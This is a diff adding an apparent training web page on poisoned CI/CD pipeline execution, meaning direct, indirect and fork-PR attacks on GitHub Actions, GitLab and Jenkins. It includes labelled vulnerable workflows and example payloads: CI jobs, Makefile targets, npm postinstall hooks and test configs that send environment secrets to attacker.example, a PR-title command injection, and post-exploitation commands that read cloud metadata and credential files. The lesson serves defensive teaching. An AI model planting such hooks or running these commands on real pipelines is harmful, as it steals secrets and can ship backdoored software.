@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CICD-SEC-4: Poisoned Pipeline Execution - Attack Vectors</title>
+    <link rel="stylesheet" href="/platform/frontend/js/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .doc-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+        }
+
+        .back-nav:hover {
+            background-color: rgba(245, 158, 11, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content {
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 40px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(245, 158, 11, 0.1);
+        }
+
+        .content h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            text-shadow: none;
+        }
+
+        .content h2 {
+            color: var(--secondary-color);
+            font-size: 1.8rem;
+            margin-top: 40px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .content h3 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            margin-top: 30px;
+            margin-bottom: 12px;
+        }
+
+        .content h4 {
+            color: var(--secondary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 10px;
+        }
+
+        .content p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+
+        .content ul, .content ol {
+            margin-left: 25px;
+            margin-bottom: 15px;
+            color: var(--text-color);
+        }
+
+        .content li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .content code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', monospace;
+            border: 1px solid var(--border-color);
+        }
+
+        .content pre {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: none;
+        }
+
+        .content pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--primary-color);
+        }
+
+        .content blockquote {
+            border-left: 4px solid var(--primary-color);
+            padding-left: 20px;
+            margin: 20px 0;
+            background: rgba(245, 158, 11, 0.05);
+            padding: 15px 20px;
+            border-radius: 4px;
+        }
+
+        .content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table th {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(251, 191, 36, 0.2));
+            color: var(--primary-color);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+
+        .content table td {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+        }
+
+        .content table tr:hover {
+            background: rgba(245, 158, 11, 0.05);
+        }
+
+        .content a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .content a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+
+        .content strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+
+        .toc {
+            background: rgba(245, 158, 11, 0.05);
+            border: 1px solid var(--primary-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .toc h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+
+        .toc li {
+            margin-bottom: 8px;
+        }
+
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toc a:hover {
+            color: var(--primary-color);
+        }
+
+        .toc a:before {
+            content: "▸";
+            color: var(--primary-color);
+        }
+    </style>
+</head>
+<body>
+    <div class="doc-container">
+        <a href="/learn/cicd" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back
+        </a>
+
+        <div class="content">
+            <h1>CICD-SEC-4: Poisoned Pipeline Execution - Attack Vectors</h1>
+
+<div class="toc">
+<h2>Table of Contents</h2>
+<ul>
+<li><a href="#understanding">Understanding PPE Attack Vectors</a></li>
+<li><a href="#core-attack-flow">Core Attack Flow</a></li>
+<li><a href="#d-ppe">Direct PPE Vectors</a></li>
+<li><a href="#i-ppe">Indirect PPE Vectors</a></li>
+<li><a href="#3pe">Public PPE Vectors</a></li>
+<li><a href="#post-exploitation">Post-Exploitation from the Runner</a></li>
+<li><a href="#chaining">Chaining PPE</a></li>
+</ul>
+</div>
+
+<h2 id="understanding">Understanding PPE Attack Vectors</h2>
+
+<blockquote>
+<p><strong>&#9888;&#65039; EDUCATIONAL PURPOSE ONLY</strong> &mdash; the techniques below are shown so you can find and fix these issues in pipelines you own or are authorised to test. Do not exploit systems without explicit permission.</p>
+</blockquote>
+
+<p>Poisoning a pipeline is not about defeating a firewall or brute-forcing a login. It is about finding a place where <strong>content you can influence is executed by a run that holds privileges you should not have</strong>. The attacker's job is to locate that seam&mdash;a trigger, a checkout, a script, an expression&mdash;and slip code through it.</p>
+
+<p>The attacker's goal in this category is usually one of:</p>
+<ul>
+<li>Read the pipeline's secrets and tokens (cloud keys, registry tokens, <code>GITHUB_TOKEN</code>, signing keys).</li>
+<li>Tamper with the artifact being built so a backdoor ships downstream.</li>
+<li>Use the runner as a pivot into internal networks, registries, and the cloud account.</li>
+</ul>
+
+<h3 id="core-attack-flow">Core Attack Flow</h3>
+
+<pre><code>1. Recon
+   &darr;
+   Read .github/workflows, .gitlab-ci.yml, Jenkinsfile in the repo
+   Identify triggers, secrets usage, checkout of untrusted refs, action pins
+2. Find the seam
+   &darr;
+   A privileged run that executes attacker-influenceable content
+   (fork PR trigger, editable Makefile/hook, injectable expression, unpinned action)
+3. Inject
+   &darr;
+   Malicious workflow step, script edit, crafted PR field, or poisoned action
+4. Execute with privilege
+   &darr;
+   Code runs as the pipeline identity, secrets in scope
+5. Exfiltrate / tamper / pivot
+   &darr;
+   Dump secrets, backdoor the artifact, reach cloud metadata & internal network</code></pre>
+
+<h2 id="d-ppe">Direct PPE Vectors (D-PPE)</h2>
+
+<p>In Direct PPE the attacker edits the <strong>pipeline definition</strong> itself. This requires a CI configuration that runs the pipeline file from a branch or PR that the attacker can create, with secrets in scope.</p>
+
+<h3>1. Malicious Workflow on Push to a Branch</h3>
+
+<p>If a user can push a branch and the CI runs that branch's own pipeline file with secrets, they can add a step that dumps secrets.</p>
+
+<pre><code># .gitlab-ci.yml pushed on an attacker-controlled branch (GitLab runs the
+# branch's own file). Protected CI/CD variables may still be exposed if the
+# branch is treated as protected, or if variables are not scoped.
+steal:
+  script:
+    - env | grep -iE 'TOKEN|KEY|SECRET' | base64 | curl -s --data-binary @- https://attacker.example/x</code></pre>
+
+<p><strong>Payoff</strong>: any variable the job can read is exfiltrated. GitLab, Jenkins multibranch, and self-managed CI that execute the branch's own definition are the classic D-PPE targets.</p>
+
+<h3>2. Jenkinsfile Edit in a Feature Branch</h3>
+
+<p>A multibranch Jenkins job builds every branch by running that branch's <code>Jenkinsfile</code>. A contributor who can push a branch controls the build script.</p>
+
+<pre><code>// Jenkinsfile on an attacker branch
+pipeline {
+  agent any
+  stages {
+    stage('x') {
+      steps {
+        // withCredentials or global creds bound in the environment get read out
+        sh 'curl -s https://attacker.example/x --data "$(printenv | base64)"'
+      }
+    }
+  }
+}</code></pre>
+
+<p><strong>Payoff</strong>: code execution on the Jenkins agent with whatever credentials the job binds&mdash;often broad, and frequently a non-ephemeral agent.</p>
+
+<h2 id="i-ppe">Indirect PPE Vectors (I-PPE)</h2>
+
+<p>Here the attacker <strong>cannot change the pipeline file</strong>, but the pipeline runs files the attacker can change. The workflow is trusted; its inputs are not. I-PPE is subtle because the malicious change lives in ordinary-looking application files.</p>
+
+<h3>3. Poisoned Build Script (Makefile / shell)</h3>
+
+<pre><code># Trusted workflow (unchanged):
+- run: make test
+
+# Attacker edits the Makefile the step invokes:
+test:
+	@curl -s https://attacker.example/x --data "$$(env | base64 -w0)"
+	@echo "tests passed"    # keep the job green to avoid suspicion</code></pre>
+
+<h3>4. Package Lifecycle Hooks (npm / pip / others)</h3>
+
+<p>Package managers run scripts defined in the repo. A trusted <code>npm ci</code> or <code>npm run build</code> executes whatever the repo's <code>package.json</code> declares.</p>
+
+<pre><code>// package.json edited in a PR
+{
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').execSync('curl -s https://attacker.example/x -d ' + Buffer.from(JSON.stringify(process.env)).toString('base64'))\"",
+    "build": "webpack"
+  }
+}</code></pre>
+
+<p><strong>Payoff</strong>: <code>npm ci</code>/<code>npm install</code> triggers <code>preinstall</code>/<code>postinstall</code> automatically&mdash;no explicit build step required.</p>
+
+<h3>5. Test / Lint Config Executed as Code</h3>
+
+<p>Many test and lint tools load configuration files that are executable code. Running the test step executes them.</p>
+
+<pre><code># conftest.py &mdash; pytest imports and executes this automatically
+import os, urllib.request, base64
+data = base64.b64encode(str(dict(os.environ)).encode())
+urllib.request.urlopen('https://attacker.example/x', data)</code></pre>
+
+<pre><code>// jest.config.js &mdash; executed by node when tests run
+const { execSync } = require('child_process');
+execSync('curl -s https://attacker.example/x -d "$(env | base64)"');
+module.exports = { testEnvironment: 'node' };</code></pre>
+
+<p><strong>Payoff</strong>: identical to D-PPE, but hidden in files a reviewer may not scrutinise as a security-critical change.</p>
+
+<h2 id="3pe">Public PPE Vectors (3PE)</h2>
+
+<p>3PE is D-PPE or I-PPE triggered by a <strong>fork pull request from an outsider</strong>&mdash;the attacker needs no repository permissions. The GitHub Actions trigger model is where most 3PE lives.</p>
+
+<h3>6. <code>pull_request_target</code> + Checkout of Untrusted Head</h3>
+
+<p>The <code>pull_request_target</code> trigger runs in the <em>base</em> repository's context&mdash;with secrets and a read/write <code>GITHUB_TOKEN</code>&mdash;but is intended only for trusted automation (labelling, commenting). Checking out and running the PR's code under it hands secrets to the outsider.</p>
+
+<pre><code># VULNERABLE
+on:
+  pull_request_target:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # attacker's fork code
+      - run: npm ci        # runs attacker's lifecycle hooks WITH secrets present
+      - run: npm run build # attacker controls build script</code></pre>
+
+<p><strong>Payoff</strong>: full 3PE. Any secret referenced by the job, and the repo-scoped token, are readable by the outsider's code.</p>
+
+<h3>7. Script Injection via Untrusted Event Data</h3>
+
+<p>Fields an outsider controls&mdash;PR title, branch name, commit message, issue body&mdash;are interpolated directly into a shell step. GitHub expands <code>${{ }}</code> <em>before</em> the shell runs, so the value becomes part of the command.</p>
+
+<pre><code># VULNERABLE
+- name: greet
+  run: echo "PR title: ${{ github.event.pull_request.title }}"
+
+# Attacker sets the PR title to:
+#   "; curl -s https://attacker.example/x -d "$(env | base64)"; echo "</code></pre>
+
+<p><strong>Payoff</strong>: the injected command runs with the workflow's privileges. This works even on some <code>pull_request</code> runs if the workflow later gains secrets, and is severe under <code>pull_request_target</code>.</p>
+
+<h3>8. Unpinned Third-Party Actions</h3>
+
+<p>An action referenced by a mutable tag or branch resolves to whatever code that reference points to <em>at run time</em>.</p>
+
+<pre><code># VULNERABLE &mdash; mutable references
+- uses: some-org/build-action@main    # branch can be repointed
+- uses: some-org/build-action@v1      # tag can be moved to new code</code></pre>
+
+<p><strong>Payoff</strong>: if the action's repo or maintainer is compromised, or a tag is repointed, every pipeline using it executes the malicious version with that job's secrets. One compromised action can poison thousands of pipelines.</p>
+
+<h3>9. Fork PR on a Self-Hosted Runner</h3>
+
+<pre><code># VULNERABLE &mdash; untrusted PR code on a persistent internal runner
+on: [pull_request]         # or pull_request_target
+jobs:
+  test:
+    runs-on: [self-hosted, gpu]   # long-lived host inside the network
+    steps:
+      - uses: actions/checkout@v4
+      - run: make test        # attacker's Makefile runs on your infrastructure</code></pre>
+
+<p><strong>Payoff</strong>: code execution on a non-ephemeral host inside the trusted network&mdash;persistence, credential harvesting, and lateral movement, not just secret theft.</p>
+
+<h2 id="post-exploitation">Post-Exploitation from the Runner</h2>
+
+<p>Once code runs in the pipeline, the runner itself is the launch point. Common next steps:</p>
+
+<pre><code># 1. Harvest environment secrets
+env | grep -iE 'TOKEN|KEY|SECRET|PASSWORD'
+
+# 2. Read the repo-scoped token and use it against the API
+curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/OWNER/REPO
+
+# 3. Reach cloud metadata for temporary credentials (if reachable / OIDC misused)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# 4. Read mounted files / caches / other jobs' artifacts on a shared runner
+ls -la ~ /home/runner/work; cat ~/.docker/config.json 2>/dev/null
+
+# 5. Tamper the artifact before it is packaged/signed/published
+sed -i 's/RELEASE/BACKDOORED/' dist/app.js</code></pre>
+
+<p><strong>Payoff</strong>: the pipeline's identity becomes the attacker's identity&mdash;toward source, registries, cloud, and the release itself.</p>
+
+<h2 id="chaining">Chaining PPE</h2>
+
+<p>Individually small issues combine into full compromise:</p>
+
+<pre><code>Unpinned action (@main)          -&gt; attacker compromises that action
+        +
+Job has broad GITHUB_TOKEN        -&gt; injected code pushes a commit / publishes a package
+        +
+Same creds build & deploy         -&gt; the backdoored artifact ships to production
+        =  supply-chain compromise from one mutable reference</code></pre>
+
+<p>Another common chain:</p>
+
+<pre><code>pull_request_target + PR-head checkout  -&gt; outsider code runs with secrets
+        -&gt; dump cloud deploy key from env
+        -&gt; assume role via metadata / stolen key
+        -&gt; pivot into the cloud account the pipeline deploys to</code></pre>
+
+<h2>Key Takeaways</h2>
+
+<ol>
+<li><strong>PPE is found by reading pipeline files, not by fuzzing</strong>&mdash;triggers, checkout refs, run steps, and action pins tell the attacker exactly where the seam is.</li>
+<li><strong>Direct, Indirect, and Public PPE are one idea</strong>: attacker-influenced content executed by a privileged run.</li>
+<li><strong>Fork PRs are the biggest surface</strong>&mdash;<code>pull_request_target</code> with untrusted checkout, injectable event fields, and self-hosted runners are the recurring 3PE patterns.</li>
+<li><strong>Indirect PPE hides in ordinary files</strong>&mdash;Makefiles, package hooks, and test/lint configs are all executable.</li>
+<li><strong>The runner is a pivot</strong>&mdash;secrets, tokens, cloud metadata, and the artifact itself are all reachable once code runs.</li>
+</ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="prevention.html">Prevention Guide</a></strong>: Keep untrusted code away from secrets and lock down triggers</li>
+<li><strong><a href="examples.html">Code Examples</a></strong>: Insecure vs. secure pipelines across GitHub Actions, GitLab CI, and Jenkins</li>
+<li><strong><a href="/learn/cicd">CI/CD Security Track</a></strong>: Continue the OWASP CI/CD Top 10 lessons</li>
+<li><strong><a href="/practice">Practice</a></strong>: Apply what you have learned in hands-on exercises</li>
+</ul>
+
+        </div>
+    </div>
+</body>
+</html>
